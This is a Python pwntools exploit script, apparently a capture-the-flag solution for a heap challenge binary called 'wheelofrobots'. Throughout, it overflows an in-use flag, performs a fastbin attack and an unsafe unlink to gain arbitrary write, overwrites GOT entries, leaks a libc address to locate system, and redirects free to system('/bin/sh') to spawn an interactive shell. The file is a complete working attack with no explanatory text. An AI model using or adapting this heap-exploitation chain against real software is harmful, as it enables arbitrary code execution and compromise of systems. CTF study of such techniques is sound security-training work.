# -*- coding: utf-8 -*-
from pwn import *

#context(log_level='debug')

p = process("./wheelofrobots")
elf = ELF("./wheelofrobots")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(idx,size=0):
    p.recvuntil("Your choice : ")
    p.sendline(str(1));
    p.recvuntil("Your choice :")
    p.sendline(str(idx))
    if idx==2:   # <=4
        p.recvuntil("Increase Bender's intelligence: ")
        p.sendline(str(size))
    elif idx == 3:  # <=0x63
        p.recvuntil("Increase Robot Devil's cruelty: ")
        p.sendline(str(size))
    elif idx == 6:
        p.recvuntil("Increase Destructor's powerful: ")
        p.sendline(str(size))

def remove(idx):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))

def change(idx, name):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))
    p.recvuntil("Robot's name: \n")
    p.send(name)
    sleep(0.1)

def start_robot():
    p.recvuntil('Your choice :')
    p.sendline('4')

def overflow_benderinuse(inuse):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.send('9999' + inuse)
    sleep(0.1)

def write(where, what):
    change(1, p64(where))
    change(6, p64(what))

#gdb.attach(p)
add(2,1)
remove(2)
overflow_benderinuse("\x01")
change(2,p64(0x603138))
overflow_benderinuse("\x00")
add(2,1)
add(3,0x20)
add(1)
remove(2)
remove(3)
log.success("fastbin attack")

add(6,3)
add(3,7)

change(1,p64(1000))

ptr = 0x6030e8
payload = p64(0)+p64(0x21)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0x20)
payload = payload.ljust(0x40,"a")
payload+= p64(0x40)+p64(0xa0)
change(6,payload)
remove(3)
log.success("unlink")

# 6030f8(heap1)->6030e8(heap6)
# anywhere write
payload = p64(0) * 2 + 0x18 * 'a' + p64(0x6030E8)
change(6, payload)
log.success("anywhere write")

write(elf.got['exit'], 0x401954)
write(0x603130, 3)

change(1, p64(elf.got['puts']))
start_robot()
p.recvuntil('New hands great!! Thx ')
puts_addr = p.recvuntil('!\n', drop=True).ljust(8, '\x00')
puts_addr = u64(puts_addr)
log.success('puts addr: ' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
log.success('libc base: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search('/bin/sh'))

write(elf.got['free'], system_addr)
write(0x6030E8, binsh_addr)
remove(6)

p.interactive()
